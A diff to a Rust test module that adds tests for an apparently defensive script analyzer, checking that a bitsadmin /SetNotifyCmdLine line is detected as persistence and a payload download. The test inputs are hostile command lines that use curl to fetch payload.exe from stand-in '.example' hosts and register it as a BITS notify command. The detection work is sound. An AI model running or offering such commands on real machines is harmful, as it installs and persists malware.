@@ -8151,6 +8151,7 @@ mod certutil_tests {
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod bitsadmin_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
@@ -8295,6 +8296,76 @@ mod bitsadmin_tests {
                         && dst == "C:\\Temp\\payload.exe"
             )),
             "no attached-addfile BitsadminDownload: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_setnotifycmdline_child_command_is_analyzed() {
+        let report = analyze(
+            br#"bitsadmin /SetNotifyCmdLine job1 cmd.exe "/c curl -o C:\Temp\notify.exe https://bits-notify.example/payload.exe""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Persistence {
+                        hive,
+                        key,
+                        value_name,
+                        command,
+                    } if hive == "BITS"
+                        && key == "job1"
+                        && value_name == "SetNotifyCmdLine"
+                        && command == r#"cmd.exe /c curl -o C:\Temp\notify.exe https://bits-notify.example/payload.exe"#
+                )
+            }),
+            "BITS notify command was not surfaced as persistence: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download {
+                        src,
+                        dst: Some(dst),
+                        ..
+                    } if src == "https://bits-notify.example/payload.exe"
+                        && dst == "C:\\Temp\\notify.exe"
+                )
+            }),
+            "BITS notify child command was not recursively analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_setnotifycmdline_in_deob_text_emits_persistence() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /SetNotifyCmdLine job1 cmd.exe "/c curl -o C:\Temp\notify.exe https://bits-notify-text.example/payload.exe""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Persistence {
+                        hive,
+                        key,
+                        value_name,
+                        command,
+                    } if hive == "BITS"
+                        && key == "job1"
+                        && value_name == "SetNotifyCmdLine"
+                        && command == r#"cmd.exe /c curl -o C:\Temp\notify.exe https://bits-notify-text.example/payload.exe"#
+                )
+            }),
+            "no BITS SetNotifyCmdLine persistence in deob text: {:?}",
             env.traits
         );
     }
